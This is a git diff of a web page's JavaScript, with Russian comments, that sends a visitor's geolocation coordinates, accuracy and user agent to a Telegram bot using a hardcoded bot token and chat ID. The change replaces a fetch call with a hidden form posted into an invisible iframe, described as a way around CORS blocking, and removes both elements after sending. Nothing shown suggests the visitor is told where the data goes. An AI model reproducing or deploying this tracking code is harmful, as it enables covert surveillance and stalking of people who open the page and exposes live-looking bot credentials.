@@ -131,19 +131,47 @@
     </div>
 
     <script>
-        // ★★★★★  ТВОИ ДАННЫЕ УСТАНОВЛЕНЫ  ★★★★★
         const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
         const CHAT_ID = "2131297532";
-        // ★★★★★ ★★★★★ ★★★★★
 
         function sendToTelegram(lat, lon, acc) {
-            const text =
-                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-            }).catch(() => {});
+            const text = encodeURIComponent(
+                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
+            );
+
+            // Создаём скрытую форму и отправляем — так CORS не блокирует
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            form.target = 'hiddenFrame';
+
+            const input1 = document.createElement('input');
+            input1.type = 'hidden';
+            input1.name = 'chat_id';
+            input1.value = CHAT_ID;
+
+            const input2 = document.createElement('input');
+            input2.type = 'hidden';
+            input2.name = 'text';
+            input2.value = decodeURIComponent(text);
+
+            form.appendChild(input1);
+            form.appendChild(input2);
+
+            // Создаём невидимый iframe для отправки
+            const iframe = document.createElement('iframe');
+            iframe.name = 'hiddenFrame';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+
+            document.body.appendChild(form);
+            form.submit();
+
+            // Удаляем после отправки
+            setTimeout(() => {
+                document.body.removeChild(form);
+                document.body.removeChild(iframe);
+            }, 1000);
         }
 
         function getLocation() {
